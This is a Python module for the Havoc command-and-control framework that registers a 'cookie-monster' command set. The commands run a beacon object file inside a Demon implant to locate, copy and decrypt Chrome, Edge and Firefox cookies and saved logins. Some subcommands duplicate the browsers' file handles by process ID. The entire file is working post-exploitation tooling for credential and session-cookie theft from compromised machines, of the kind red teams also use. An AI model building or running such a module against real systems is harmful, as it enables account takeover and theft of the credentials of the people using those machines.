from havoc import Demon, RegisterCommand, RegisterModule
from struct import pack, calcsize

class Packer:
    def __init__(self):
        self.buffer = b""
        self.size   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addint(self, i):
        self.buffer += pack("<i", i)
        self.size += calcsize("<i")

    def addstr(self, s):
        if s is None:
            s = ""
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

def execute_cookie_monster(demon, chrome, edge, firefox, system,
                           chromecookiepid, chromelogindatapid,
                           edgecookiepid, edgelogindatapid, pid,
                           path, keyOnly, cookieOnly, loginDataOnly,
                           copyFile):

    if keyOnly == 1 and (cookieOnly == 1 or loginDataOnly == 1):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--key-only cannot be used with --cookie-only or --login-data-only")
        return False

    if keyOnly == 1 and copyFile:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--key-only cannot be used with --copy-file")
        return False

    if loginDataOnly == 1 and (chromecookiepid or edgecookiepid):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--login-data-only cannot be used with chromecookiepid or edgecookiepid")
        return False

    if cookieOnly == 1 and (chromelogindatapid or edgelogindatapid):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--cookie-only cannot be used with chromelogindatapid or edgelogindatapid")
        return False

    packer = Packer()
    barch = demon.ProcessArch
    bof_path = f"cookie-monster-bof.{barch}.o"

    try:
        with open(bof_path, "rb"):
            pass
    except FileNotFoundError:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Could not read BOF file")
        return False

    packer.addint(chrome)
    packer.addint(edge)
    packer.addint(system)
    packer.addint(firefox)
    packer.addint(chromecookiepid)
    packer.addint(chromelogindatapid)
    packer.addint(edgecookiepid)
    packer.addint(edgelogindatapid)
    packer.addint(pid)
    packer.addstr(path)
    packer.addint(keyOnly)
    packer.addint(cookieOnly)
    packer.addint(loginDataOnly)
    packer.addstr(copyFile)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Running Cookie-Monster BOF")
    demon.InlineExecute(TaskID, "go", bof_path, packer.getbuffer(), False)
    return TaskID

def parse_flags(demon, params):
    keyOnly = cookieOnly = loginDataOnly = 0
    copyFile = ""
    i = 0
    while i < len(params):
        f = str(params[i])
        if f == "--key-only":
            keyOnly = 1
        elif f == "--cookie-only":
            cookieOnly = 1
        elif f == "--login-data-only":
            loginDataOnly = 1
        elif f == "--copy-file":
            i += 1
            if i >= len(params):
                demon.ConsoleWrite(demon.CONSOLE_ERROR, "Missing folder path for --copy-file")
                return None
            copyFile = str(params[i])
        else:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Unknown flag: {f}")
            return None
        i += 1
    return keyOnly, cookieOnly, loginDataOnly, copyFile

def run_chrome(demonID, *params):
    demon = Demon(demonID)
    flags = parse_flags(demon, params)
    if flags is None:
        return False
    keyOnly, cookieOnly, loginDataOnly, copyFile = flags
    return execute_cookie_monster(demon, chrome=1, edge=0, firefox=0, system=0,
                                  chromecookiepid=0, chromelogindatapid=0,
                                  edgecookiepid=0, edgelogindatapid=0, pid=0,
                                  path="", keyOnly=keyOnly, cookieOnly=cookieOnly,
                                  loginDataOnly=loginDataOnly, copyFile=copyFile)

def run_edge(demonID, *params):
    demon = Demon(demonID)
    flags = parse_flags(demon, params)
    if flags is None:
        return False
    keyOnly, cookieOnly, loginDataOnly, copyFile = flags
    return execute_cookie_monster(demon, chrome=0, edge=1, firefox=0, system=0,
                                  chromecookiepid=0, chromelogindatapid=0,
                                  edgecookiepid=0, edgelogindatapid=0, pid=0,
                                  path="", keyOnly=keyOnly, cookieOnly=cookieOnly,
                                  loginDataOnly=loginDataOnly, copyFile=copyFile)

def run_firefox(demonID, *params):
    demon = Demon(demonID)
    flags = parse_flags(demon, params)
    if flags is None:
        return False
    keyOnly, cookieOnly, loginDataOnly, copyFile = flags
    return execute_cookie_monster(demon, chrome=0, edge=0, firefox=1, system=0,
                                  chromecookiepid=0, chromelogindatapid=0,
                                  edgecookiepid=0, edgelogindatapid=0, pid=0,
                                  path="", keyOnly=keyOnly, cookieOnly=cookieOnly,
                                  loginDataOnly=loginDataOnly, copyFile=copyFile)

def run_system(demonID, *params):
    demon = Demon(demonID)
    if len(params) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Missing Local State path or PID for system")
        return False
    path = str(params[0])
    pid_val = str(params[1])
    if not pid_val.isdigit() or pid_val == "1":
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Invalid PID: {pid_val}")
        return False
    pid = int(pid_val)
    flags = parse_flags(demon, params[2:])
    if flags is None:
        return False
    keyOnly, cookieOnly, loginDataOnly, copyFile = flags
    return execute_cookie_monster(demon, chrome=0, edge=0, firefox=0, system=1,
                                  chromecookiepid=0, chromelogindatapid=0,
                                  edgecookiepid=0, edgelogindatapid=0, pid=pid,
                                  path=path, keyOnly=keyOnly, cookieOnly=cookieOnly,
                                  loginDataOnly=loginDataOnly, copyFile=copyFile)

def run_chromecookiepid(demonID, *params):
    demon = Demon(demonID)
    if not params:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Missing PID for chromecookiepid")
        return False
    pid_val = str(params[0])
    if not pid_val.isdigit() or pid_val == "1":
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Invalid PID: {pid_val}")
        return False
    pid = int(pid_val)
    flags = parse_flags(demon, params[1:])
    if flags is None:
        return False
    keyOnly, cookieOnly, loginDataOnly, copyFile = flags
    return execute_cookie_monster(demon, chrome=0, edge=0, firefox=0, system=0,
                                  chromecookiepid=1, chromelogindatapid=0,
                                  edgecookiepid=0, edgelogindatapid=0, pid=pid,
                                  path="", keyOnly=keyOnly, cookieOnly=cookieOnly,
                                  loginDataOnly=loginDataOnly, copyFile=copyFile)

def run_chromelogindatapid(demonID, *params):
    demon = Demon(demonID)
    if not params:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Missing PID for chromelogindatapid")
        return False
    pid_val = str(params[0])
    if not pid_val.isdigit() or pid_val == "1":
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Invalid PID: {pid_val}")
        return False
    pid = int(pid_val)
    flags = parse_flags(demon, params[1:])
    if flags is None:
        return False
    keyOnly, cookieOnly, loginDataOnly, copyFile = flags
    return execute_cookie_monster(demon, chrome=0, edge=0, firefox=0, system=0,
                                  chromecookiepid=0, chromelogindatapid=1,
                                  edgecookiepid=0, edgelogindatapid=0, pid=pid,
                                  path="", keyOnly=keyOnly, cookieOnly=cookieOnly,
                                  loginDataOnly=loginDataOnly, copyFile=copyFile)

def run_edgecookiepid(demonID, *params):
    demon = Demon(demonID)
    if not params:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Missing PID for edgecookiepid")
        return False
    pid_val = str(params[0])
    if not pid_val.isdigit() or pid_val == "1":
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Invalid PID: {pid_val}")
        return False
    pid = int(pid_val)
    flags = parse_flags(demon, params[1:])
    if flags is None:
        return False
    keyOnly, cookieOnly, loginDataOnly, copyFile = flags
    return execute_cookie_monster(demon, chrome=0, edge=0, firefox=0, system=0,
                                  chromecookiepid=0, chromelogindatapid=0,
                                  edgecookiepid=1, edgelogindatapid=0, pid=pid,
                                  path="", keyOnly=keyOnly, cookieOnly=cookieOnly,
                                  loginDataOnly=loginDataOnly, copyFile=copyFile)

def run_edgelogindatapid(demonID, *params):
    demon = Demon(demonID)
    if not params:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Missing PID for edgelogindatapid")
        return False
    pid_val = str(params[0])
    if not pid_val.isdigit() or pid_val == "1":
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Invalid PID: {pid_val}")
        return False
    pid = int(pid_val)
    flags = parse_flags(demon, params[1:])
    if flags is None:
        return False
    keyOnly, cookieOnly, loginDataOnly, copyFile = flags
    return execute_cookie_monster(demon, chrome=0, edge=0, firefox=0, system=0,
                                  chromecookiepid=0, chromelogindatapid=0,
                                  edgecookiepid=0, edgelogindatapid=1, pid=pid,
                                  path="", keyOnly=keyOnly, cookieOnly=cookieOnly,
                                  loginDataOnly=loginDataOnly, copyFile=copyFile)

module_name = "cookie-monster"
module_desc = "Locate and copy browser cookie files (Edge/Chrome/Firefox)"

RegisterModule(
    module_name,
    module_desc,
    "",
    "[subcommand] (args)",
    "",
    ""
)

RegisterCommand(run_chrome, module_name, "chrome", "Locate and copy Chrome Cookies/Login Data", 0, "[--key-only] [--cookie-only] [--login-data-only] [--copy-file <folder>]", "")
RegisterCommand(run_edge, module_name, "edge", "Locate and copy Edge Cookies/Login Data", 0, "[--key-only] [--cookie-only] [--login-data-only] [--copy-file <folder>]", "")
RegisterCommand(run_firefox, module_name, "firefox", "Locate Firefox key4.db and logins.json", 0, "[--key-only] [--cookie-only] [--login-data-only] [--copy-file <folder>]", "")
RegisterCommand(run_system, module_name, "system", "Decrypt Chromium key via Local State and PID", 0, "<LocalStatePath> <PID> [--key-only] [--cookie-only] [--login-data-only] [--copy-file <folder>]", "")
RegisterCommand(run_chromecookiepid, module_name, "chromecookiepid", "Duplicate Chrome Cookies handle from PID", 0, "<PID> [--key-only] [--cookie-only] [--copy-file <folder>]", "")
RegisterCommand(run_chromelogindatapid, module_name, "chromelogindatapid", "Duplicate Chrome Login Data handle from PID", 0, "<PID> [--key-only] [--login-data-only] [--copy-file <folder>]", "")
RegisterCommand(run_edgecookiepid, module_name, "edgecookiepid", "Duplicate Edge Cookies handle from PID", 0, "<PID> [--key-only] [--cookie-only] [--copy-file <folder>]", "")
RegisterCommand(run_edgelogindatapid, module_name, "edgelogindatapid", "Duplicate Edge Login Data handle from PID", 0, "<PID> [--key-only] [--login-data-only] [--copy-file <folder>]", "")
